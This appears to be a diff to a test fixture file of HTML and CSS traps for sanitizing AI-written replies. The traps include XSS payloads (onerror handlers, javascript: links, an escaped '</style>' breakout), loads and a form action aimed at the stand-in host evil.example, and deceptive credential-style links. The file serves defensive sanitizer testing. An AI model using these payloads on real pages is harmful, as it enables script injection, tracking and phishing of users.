@@ -4,6 +4,8 @@
 // parser's corners. All fictional.
 
 const PWN = (what: string) => `(top.__pwned = top.__pwned || []).push('${what}')`
+/** Every character that could end a CSS name written as an escape (`<` → `\3c `): the parser undoes them. */
+const ESCAPED = (text: string) => text.replace(/[^A-Za-z0-9_-]/g, c => `\\${c.codePointAt(0)!.toString(16)} `)
 
 /** The first version's traps: what runs, loads or covers. */
 export const TRAPS = `
@@ -121,6 +123,8 @@ export const CORNER_TRAPS = `
 <noembed><img src=x onerror="${PWN('noembed')}"></noembed>
 <svg><style>@import url(https://evil.example/svg-style.css);</style><foreignObject><img src=x onerror="${PWN('foreign')}"></foreignObject></svg>
 <svg><a href="javascript:${PWN('svg link')}"><text y="10">押して</text></a></svg>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><style>@keyframes pulse { to { opacity: 0 } } @media screen { @keyframes p2 { to { opacity: 0 } } } rect { animation: pulse 1s infinite; transition: fill 1s }</style><rect width="20" height="20" style="animation: p2 1s infinite"/></svg>
+<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 9 9'%3E%3Cstyle%3E@keyframes s { to { opacity: 0 } } circle { animation: s 1s infinite }%3C/style%3E%3Ccircle r='4' cx='4' cy='4'/%3E%3C/svg%3E" alt="動く svg の data">
 <select><option>選ぶ</option></select><textarea>書く</textarea><button formaction="https://evil.example/b">押す</button>
 <dialog open>開いた窓</dialog><div popover="auto" id="pop">ポップオーバー</div>
 <audio src="https://evil.example/a.mp3" autoplay></audio><picture><source srcset="https://evil.example/p.png"></picture>
@@ -128,6 +132,24 @@ export const CORNER_TRAPS = `
 <table background="https://evil.example/table.png"><tr><td background="https://evil.example/td.png" colspan="2x">表</td></tr></table>
 <div class="typing" style="-webkit-user-modify: read-write; clip-path: inset(0); behavior: url(x.htc); -moz-binding: url(x.xml); filter: url(#f); cursor: url(https://evil.example/c.cur), auto; mask-image: url(https://evil.example/m.png); list-style-image: url(https://evil.example/l.png)">古い仕掛け</div>
 <plaintext><img src=x onerror="${PWN('plaintext')}">
+`
+
+/** The independent review's ways around the first cut (2026-11-28): names that end the rule, chained motion, the root. */
+export const REVIEW_TRAPS = `
+<style>
+  .n1 { --x${ESCAPED(`</style><img src=x onerror=${PWN('custom name breakout')}>`)}: 1 }
+  .n2 { --x${ESCAPED('}.q{background-image:url(https://evil.example/rule.png)}.r')}: 1 }
+  .n3 { --x${ESCAPED('}*{position:fixed;inset:0}.r')}: 1 }
+  .chain { animation-name: k, k, k, k, k, k; animation-duration: 10s; animation-iteration-count: 10; animation-delay: 0s, 100s, 200s, 300s, 400s, 500s; }
+  .late { transition: color 1s 1000s; animation: k 1s 99999s; }
+  :scope { position: relative; background: red; } & { color: red; }
+  .cq { width: 100cqw; height: 100cqh; }
+  .quote { --s: "nothing closes this; }
+</style>
+<p class="n1 n2 n3 chain late cq quote" style="--a${ESCAPED(';background-image:url(https://evil.example/inline.png);--b')}: 1">名前のわな</p>
+<p style="--q: '}; background-image: url(https://evil.example/q.png)">引用符のわな</p>
+<a href="https://app.acb@evil.example/">人をあざむくリンク</a>
+<a href="https://user:pw@evil.example/">パスワードつきのリンク</a>
 `
 
 /** A reply as the AI would write it: what must survive cleaning. */
@@ -156,4 +178,4 @@ export const GOOD_REPLY = `
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 30" aria-label="売上の図"><rect width="120" height="30" fill="#e0f2fe"/><text x="10" y="20">売上</text></svg>
 `
 
-export const ALL_TRAPS = `${TRAPS}\n${SEAMLESS_TRAPS}\n${CORNER_TRAPS}`
+export const ALL_TRAPS = `${TRAPS}\n${SEAMLESS_TRAPS}\n${REVIEW_TRAPS}\n${CORNER_TRAPS}`
